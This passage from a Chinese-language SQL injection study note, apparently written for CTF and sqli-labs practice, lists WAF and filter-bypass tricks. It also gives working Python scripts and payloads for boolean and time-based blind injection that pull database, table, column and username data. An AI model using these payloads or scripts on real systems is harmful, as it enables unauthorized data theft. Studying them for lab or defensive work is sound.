?id=1' and if(ascii(substr((select database()),2,1))<=ASCII码,sleep(0),sleep(3))--+

#用二分法将第二位字符验证出来

以此类推最终得到所有字符
```

<font style="color:#601BDE;">注：相比于布尔盲注多了一个判断语句 截取字符和比较都是一样的 注入过程和布尔注入也是一样的这里就不展示了</font>

# SQL注入中常用的绕过过滤的方法
转载链接[链接](https://blog.csdn.net/weixin_42478365/article/details/119300607?ops_request_misc=&request_id=&biz_id=102&utm_term=SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E6%96%B9%E6%B3%95&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-119300607.142^v100^pc_search_result_base7&spm=1018.2226.3001.4187)

### <font style="color:#000000;">1.注释符号绕过</font>
```sql
--  注释内容
# 注释内容
/*注释内容*/
;
;%00
```

### 2.大小写绕过
如果用关键字阻塞过滤器显得不够聪明，可以通过变换攻击字符串中字符的大小写来避开它们，因为数据库使用不区分大小写的方式处理SOL关键字。例如，如果下列输入被阻止:

```sql
UNION SELECT password FROM tblUsers WHERE username='admin'--
```

可以通过下列方法绕开过滤器:

```sql
uNiOn SeLeCt password FrOm tblUsers WhErE username='admin'-- 
```

### 3.内联注释绕过
内联注释就是把一些特有的仅在MYSQL上的语句放在 /!../ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。

```sql
 select * from cms_users where userid=1 union /*!select*/ 1,2,3;
```

### 4.双写绕过
<font style="color:rgb(77, 77, 77);">使用双写绕过。因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。</font>

<font style="color:rgb(77, 77, 77);">比如 union在</font>[<font style="color:rgb(77, 77, 77);">程序员</font>](https://so.csdn.net/so/search?q=%E7%A8%8B%E5%BA%8F%E5%91%98&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">处理时被替换为空，那需要我们可以尝试把</font><font style="color:rgb(254, 44, 36);">union</font><font style="color:rgb(77, 77, 77);">改写为</font><font style="color:rgb(254, 44, 36);">Ununionion</font><font style="color:rgb(77, 77, 77);">，这样红</font>

<font style="color:rgb(77, 77, 77);">色部分替换为空，则剩下的依然为union还可以</font><font style="color:rgb(254, 44, 36);">结合大小写</font><font style="color:rgb(77, 77, 77);">过滤一起使用</font>

### <font style="color:#000000;">5.编码绕过</font>
<font style="color:rgb(77, 77, 77);">如URLEncode编码，ASCII,HEX,unicode编码绕过：</font>

#### **<font style="color:rgb(77, 77, 77);">对关键字进行两次url全编码：</font>**
```sql
1+and+1=2
1+%25%36%31%25%36%65%25%36%34+1=2 
```

#### **<font style="color:rgb(77, 77, 77);">ascii编码绕过</font>**
```sql
Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
#利用函数CHAR()结合字母的ASCII码值拼接成被过滤的关键字
```

#### <font style="color:rgb(77, 77, 77);">16进制绕过：</font>
```sql
select * from users where username = test1;
select * from users where username = 0x7465737431;
#将test转化成16进制
```

#### <font style="color:rgb(77, 77, 77);">unicode编码对部分符号的绕过：</font>
```sql
单引号=> %u0037 %u02b9
空格=> %u0020 %uff00
左括号=> %u0028 %uff08
右括号=> %u0029 %uff09
```

### <font style="color:rgb(79, 79, 79);">6.<>大于小于号绕过</font>
<font style="color:rgb(77, 77, 77);">在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</font>

#### <font style="color:rgb(77, 77, 77);">greatest()和least()</font>
<font style="color:rgb(77, 77, 77);">greatest(n1, n2, n3…):返回n中的最大值 或least(n1,n2,n3…):返回n中的最小值</font>

```sql
select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;
```

#### <font style="color:rgb(77, 77, 77);">strcmp()</font>
<font style="color:rgb(77, 77, 77);">strcmp(str1,str2):</font>  
<font style="color:rgb(77, 77, 77);">若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 </font><font style="color:rgb(77, 77, 77);">1</font>

```sql
select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99);
```

#### <font style="color:rgb(77, 77, 77);">in关键字</font>
```sql
select * from cms_users where userid=1 and substr(database(),1,1) in ('c');
```

#### <font style="color:rgb(77, 77, 77);">between a and b</font>
<font style="color:rgb(77, 77, 77);">between a and b:范围在a-b之间（不包含b）</font>

```sql
select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';
```

### 7.空格绕过
<font style="color:rgb(77, 77, 77);">一般绕过空格过滤的方法有以下几种方法来取代空格</font>

```sql
/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
```

### <font style="color:rgb(79, 79, 79);">8.对or and xor not 绕过</font>
```sql
or = ||
and = &&
xor = | 或者 ^ # 异或,例如Select * from cms_users where userid=1^sleep(5);
not = !
```

### <font style="color:rgb(79, 79, 79);">9.对等号=绕过</font>
#### like
<font style="color:rgb(77, 77, 77);">不加通配符的like执行的效果和 = 一致，所以可以用来绕过。</font>  
<font style="color:rgb(77, 77, 77);">正常加上通配符的like：</font>

```sql
 Select * from cms_users where username like "ad%";
```

<font style="color:rgb(77, 77, 77);">不加上通配符的like可以用来取代=：</font>

```sql
 Select * from cms_users where username like "admin";
```

#### <font style="color:rgb(77, 77, 77);">REGEXP</font>
<font style="color:rgb(77, 77, 77);">regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</font>

```sql
Select * from cms_users where username REGEXP "admin";
```

#### 大于号小于号
<font style="color:rgb(77, 77, 77);">使用大小于号来绕过</font>

```sql
Select * from cms_users where userid>0 and userid<2; #userid=1
```

<font style="color:rgb(77, 77, 77);"><> 等价于 != ,所以在前面再加一个 ! 结果就是等号了</font>

```sql
Select * from cms_users where !(username <> "admin");
```

### <font style="color:rgb(79, 79, 79);">10.对单引号的绕过</font>
#### 使用十六进制
<font style="color:rgb(77, 77, 77);">会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</font>

```sql
select column_name  from information_schema.tables where table_name="users"
```

<font style="color:rgb(77, 77, 77);">这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</font>  
<font style="color:rgb(77, 77, 77);">users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</font>

```sql
select column_name  from information_schema.tables where table_name=0x7573657273
```

#### 宽字节绕过
<font style="color:rgb(77, 77, 77);">过滤单引号时，可以试试宽字节</font>

<font style="color:rgb(77, 77, 77);">过滤 ' 的时候往往利用的思路是将 ' 转换为 \' 。</font>

<font style="color:rgb(77, 77, 77);">在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字</font>

<font style="color:#601BDE;">%df</font><font style="color:rgb(77, 77, 77);"> 吃掉 \ 具体的方法是 urlencode(’) = </font><font style="color:#601BDE;">%5c%27</font><font style="color:rgb(77, 77, 77);">，我们在 </font><font style="color:#601BDE;">%5c%27</font><font style="color:rgb(77, 77, 77);"> 前面添加 </font><font style="color:#601BDE;">%df</font><font style="color:rgb(77, 77, 77);"> ，形成</font><font style="color:#601BDE;">%df%5c%27 </font><font style="color:rgb(77, 77, 77);">，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，</font><font style="color:#601BDE;">%df%5c</font><font style="color:rgb(77, 77, 77);"> 就是一个汉字，</font><font style="color:#601BDE;">%27</font><font style="color:rgb(77, 77, 77);"> 作为一个单独的 ’ 符号在外面：</font>

```sql
id=-1%df%27union select 1,user(),3--+
```

### 11.对于逗号的绕过
<font style="color:rgb(77, 77, 77);">sql盲注时常用到以下的函数：</font>

```sql
substr()
substr(string, pos, len):从pos开始，取长度为len的子串
substr(string, pos):从pos开始，取到string的最后

substring()
用法和substr()一样

mid()
用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的

left()和right()
left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串

limit
limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始

ascii()和char()
ascii(char):把char这个字符转为ascii码
char(ascii_int):和ascii()的作用相反，将ascii码转字符
```

#### **<font style="color:#000000;">对于substr()和mid()这两个方法可以使用from for 的方式来解决</font>**
```sql
 select substr(database() from 1 for 1)='c';
```

#### <font style="color:#000000;">使用join关键字来绕过</font>
```sql
union select 1,2,3,4;
union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
```

#### <font style="color:#000000;">使用like关键字 适用于substr()等提取子串的函数中的逗号</font>
```sql
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

#### <font style="color:#000000;">使用offset关键字</font>
```sql
 select * from cms_users limit 0,1;
# 等价于下面这条SQL语句
 select * from cms_users limit 1 offset 0;
```

### 12.过滤函数绕过
#### sleep()被过滤时
sleep()时延时盲注中最常见的函数 当sleep()被过滤时可以使用benchmark()来代替

```sql
sleep() -->benchmark()
select 12,23 and sleep(1);
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
select 12,23 and benchmark(10000000,1);
```

#### ascii()被过滤时
```sql
ascii()–>hex()、bin()
替代之后再使用对应的进制转string即可
```

#### group_concat()被过滤时
```sql
group_concat()–>concat_ws()
select group_concat(“str1”,“str2”);#等价于
select concat_ws(“,”,“str1”,“str2”);
```

#### <font style="color:#000000;">substr(),substring(),mid()被过滤时</font>
```sql
substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()
```

#### <font style="color:#000000;">user() datadir ord()被过滤时</font>
```sql
user() --> @@user、datadir–>@@datadir
ord()–>ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。
```

#### <font style="color:#000000;">过滤了if函数：</font>
```sql
if函数的判断语句
select if(substr(database(),1,1)='c',1,0);
IFNULL函数
select ifnull(substr(database(),1,1)='c',0);
case when then函数
select case substr(database(),1,1)='c' when 1 then 1 else 0 end;
```

# SQL自动化注入的python脚本
SQL自动化注入工具一般使用python脚本 使用python脚本的好处在于可以根据题目需要的条件修改相应的部分 而且编写起来也比较方便



### 布尔盲注的python脚本编写思路（大概思路）
以sqli-labs less8为例

由于sql注入点是用GET传参 通过引用requests库来对url发送重复请求 

并定义chars作为字典<font style="color:#601BDE;">（后面会用到char for chars的遍历来确定字符）</font>

再定义一个send_payload()函数作为判断条件

当页面中出现"You are in..........."<font style="color:#601BDE;">（并不唯一 根据遇到的题目变化而变化）</font>返回真 可以使字符遍历时找到正确的字符

```python
import requests

global url #定义一个全局变量url
url = input("Enter the URL: ")
global chars
chars = "abcdefghijklmnopqrstuvwxyz_#!@ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def send_payload(payload):
    res = requests.get(url + payload)
    res.encoding = 'utf-8'
    if "You are in..........." in res.text:#这里是标志字符串，自行修改
        return True
    else:
        return False
```

以上作为布尔盲注的基本框架

下面我们只要根据框架定义想要的函数即可

例如

定义get_database_name_length()函数 利用length=length+1的自增及 send_payload()函数的判断 遍历出数据库的长度

然后再定义get_database_name(length)函数 利用<font style="color:#601BDE;">for i in range(1,length+1) </font><font style="color:#000000;">控制循环次数 并且利用上面所提到的</font><font style="color:#601BDE;">char for chars的遍历来确定字符 </font><font style="color:#000000;">最后把确定的字符拼接到一起得到数据库名字</font>

```python
def get_database_name_length():
    length = 0
    while True:
        length = length + 1
        payload = f"' OR (SELECT LENGTH(database()))={length}--+" #payload一般也根据题目改变 如绕过过滤等
        if send_payload(payload):
            print(f"Database name length: {length}")
            return length
#试出数据库名字的长度
def get_database_name(length):
    database_name = ""
    for i in range(1,length+1):
        for char in chars:
            payload = f"' OR (SELECT ASCII(SUBSTRING(database(),{i},1)))= {ord(char)}--+" #payload一般也根据题目改变 如绕过过滤等
            if send_payload(payload):
                database_name = database_name + char
                print(f"Database name: {database_name}")
                break
    print("Database name:",database_name)
    return database_name
#试出数据库的名字  
```

根据这个框架 爆出数据库名称后 根据爆出数据库名称 并修改对应的参数和payload接着定义新的爆破函数 

### 延时注入的python脚本编写思路（大概思路）
说实话 延时注入脚本不是很会写 这里转载别人的 参考文章[链接](https://blog.csdn.net/m0_61815757/article/details/124155576?sharetype=blog&shareId=124155576&sharerefer=APP&sharesource=2301_82267803&sharefrom=qq)

**<font style="color:rgb(79, 79, 79);">首先是爆库</font>**

```python
import requests                                  //最关键的requests库，可以好好了解一下
import time                                       //这个也是必要的
chars='，abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'//爆破
database=''                                                //把结果加到这个变量里
global length                                                
 
for l in range(1,20):                        //这里有时候range 要大些，因为用了group_concat把结果都放在一行了，可能使长度很大
    url ='http://192.168.1.100/sqli-labs-master/Less-5/' //url自己根据情况改
    close="?id=1'"                                       //闭合方式
    payload1=' and if(length(database())=%s,sleep(2),0) --+' %l       //最关键的地方，和其他注入方法的payload 差不多，只是用了延时的手法
    start_time=time.time()
    r=requests.get(url+close+payload1)
    end_time=time.time()
    sec=end_time-start_time                //算出get请求和sleep后所用的时间
    if  sec >=2:                           //时间符号条件就print并退出
        print('database length is '+str(l))
        global length
        length =l;
        break
    else:
        pass
for i in range (1,length+1):
    for char in chars:
        payload2="and if(substr(database(),%d,1)='%s',sleep(2),1) --+" %(i,char)//substr取每位爆破
        start_time2=time.time()
        r2=requests.get(url+close+payload2)
        end_time2=time.time()
        sec2=(end_time2-start_time2)//也是一样，符合条件就输出
        if sec2 >=2:
            database+=char
            print(database)
            break
print('database_name:',database)
```

**<font style="color:rgb(79, 79, 79);">如果没有过滤可以直接得到数据库名</font>**

<font style="color:rgb(79, 79, 79);">如果要得到表名，脚本和上面差不多，url和close都一样，只需要改一下payload和一些变量名称</font>

<font style="color:rgb(79, 79, 79);">爆破的手法是：爆破长度，爆破名称</font>

<font style="color:rgb(79, 79, 79);"></font>

<font style="color:rgb(79, 79, 79);">爆破表长的</font>[<font style="color:rgb(79, 79, 79);">payload</font>](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)<font style="color:rgb(79, 79, 79);">:</font>

```python
payload="and if(length((select group_concat(table_name) from information_schema.tables where table_schema = database() limit 0,1))=%s,sleep(3),1) --+" %l
```

<font style="color:rgb(79, 79, 79);">爆破表名的payload:</font>

```python
payload = " and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database() limit 0,1),%s,1)) = %s,sleep(3),1) --+" %(j,charAscii)
```

<font style="color:#601BDE;">注：爆破名字的时候建议套上ascii()函数</font>

<font style="color:rgb(79, 79, 79);">爆破列长的payload：</font>

```python
payload=" and if(length((select group_concat(column_name) from information_schema.columns where table_name = 'users' ))=%s,sleep(3),1) --+" %l
```

<font style="color:rgb(79, 79, 79);">爆破列名的payload:</font>

```python
payload2 = " and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'users' limit 0,1),%s,1)) = %s,sleep(3),1) --+" %(j,charAscii)
```

<font style="color:rgb(79, 79, 79);">爆破字段长的payload:</font>

```python
payload=" and if(length((select group_concat(username) from users ))=%s,sleep(3),1) --+" %l
```

<font style="color:rgb(79, 79, 79);">爆破字段名的payload：</font>

```python
payload=" and if(ascii(substr((SeLeCt group_concat(username) from users ),%s,1)) = %s,sleep(3),1) --+" %(j,charAscii)
```

**<font style="color:#601BDE;">注：这里写的payload是在完全没有过滤的情况下才可以运行的。</font>**

